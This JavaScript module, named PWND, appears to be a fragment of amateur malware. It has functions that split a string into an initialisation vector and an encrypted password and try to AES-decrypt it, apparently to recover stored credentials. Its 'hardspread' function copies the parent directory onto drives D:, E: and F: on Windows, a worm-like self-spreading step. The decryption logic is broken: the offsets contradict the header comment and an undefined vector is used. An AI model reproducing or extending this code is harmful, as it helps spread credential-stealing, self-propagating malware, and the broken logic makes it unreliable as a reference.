/** Theory behind:
  * Init Vect is char 4 to 20
  * Password (encrypted) is 21 to string.length-16
  */
const aes = require('aes-js');
const { copySync } = require('fs-extra');
  sys_check = require("./sys_check");

class PWND {
    constructor() {}

    /**
      * @param {String} string
      */
    static async fndEnc(string) {
        let init_vect;
        let endStr = string
        let pass1 = endStr.substr(0,3);
        let pass2 = endStr.substr(15, string.length);
        return init_vect = String(pass1+', '+pass2);
    }

    static async decrypt(pass) {
        //let enc = aes.utils.hex.toBytes(pass); // Only if the text is utf8, plain code
        let cipher = new aes.ModeOfOperation.ofb(this.init_vect, pass);
        let dec = cipher.decrypt(pass);
        dec = aes.utils.utf8.fromBytes(dec);

        return dec;
    }

    static async hardspread() {
        if (/win32/gi.test(process.platform)) {
          try {
            copySync("../", "D:/");
          } catch (e) {
            console.log("Drive D: doesn't exist, trying new drive")
            copySync("../", "E:/");
          } finally {
            copySync("../", "F:/");
          }
        } else if ((/darwin/gi).test(process.platform)) {

        } else if ((/linux/gi).test(process.platform)) {

        } else {
          throw new Error("Unknown System Platform!!! exiting now!"), process.exit(1);
        }

    }
}

module.exports = PWND;
